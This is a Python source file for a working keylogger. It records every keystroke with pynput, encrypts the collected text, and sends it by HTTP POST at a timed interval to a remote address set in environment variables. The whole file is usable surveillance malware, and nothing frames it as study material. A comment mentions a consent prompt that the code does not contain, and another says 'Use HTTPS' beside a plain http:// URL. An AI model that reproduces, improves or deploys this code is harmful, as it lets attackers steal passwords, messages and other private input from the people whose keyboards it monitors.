from pynput import keyboard
from dotenv import load_dotenv
import requests
import json
import threading
import os
from cryptography.fernet import Fernet

load_dotenv()

# Load configuration from environment variables
IP_ADDRESS = os.getenv("KEYLOGGER_IP", "127.0.0.1")  # Default to localhost for safety
PORT_NUMBER = os.getenv("KEYLOGGER_PORT", "8080")
TIME_INTERVAL = int(os.getenv("KEYLOGGER_INTERVAL", "10"))  # Send data every 10 seconds

# Generate an encryption key (or load from a secure source)
ENCRYPTION_KEY = os.getenv("KEYLOGGER_KEY") # Store as string
cipher = Fernet(ENCRYPTION_KEY.encode())  # Encode properly

# List to store keystrokes instead of concatenating strings
keystrokes = []
lock = threading.Lock()  # Prevent race conditions

def encrypt_data(data):
    """Encrypt keystroke data before sending"""
    encrypted_bytes = cipher.encrypt(data.encode())  # Encrypt to bytes
    return encrypted_bytes.decode("utf-8", errors="ignore")  # Decode properly


def send_post_req():
    """Send collected keystrokes to the server securely"""
    global keystrokes
    
    if keystrokes:
        with lock:
            data_to_send = ''.join(keystrokes)
            keystrokes.clear()

        encrypted_data = encrypt_data(data_to_send)
        payload = json.dumps({"keyboardData": encrypted_data})

        try:
            response = requests.post(
                f"http://{IP_ADDRESS}:{PORT_NUMBER}",  # Use HTTPS
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            response.raise_for_status()  # Raise exception for HTTP errors
        except requests.exceptions.RequestException as e:
            print(f"Error sending data: {e}")

    # Schedule the next execution
    threading.Timer(TIME_INTERVAL, send_post_req).start()

def on_press(key):
    """Handle key press events"""
    global keystrokes

    with lock:
        if key == keyboard.Key.enter:
            keystrokes.append("\n")
        elif key == keyboard.Key.tab:
            keystrokes.append("\t")
        elif key == keyboard.Key.space:
            keystrokes.append(" ")
        elif key == keyboard.Key.shift or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass  # Ignore modifier keys
        elif key == keyboard.Key.backspace and keystrokes:
            keystrokes.pop()  # Remove last character on backspace
        elif key == keyboard.Key.esc:
            print("Stopping keylogger...")
            return False  # Stop the listener
        else:
            keystrokes.append(str(key).strip("'"))

def main():
    """Start the keylogger with a consent prompt"""
    print("Keylogger started. Press ESC to stop.")
    
    with keyboard.Listener(on_press=on_press) as listener:
        send_post_req()  # Start sending keystrokes periodically
        listener.join()  # Keep listening

if __name__ == "__main__":
    main()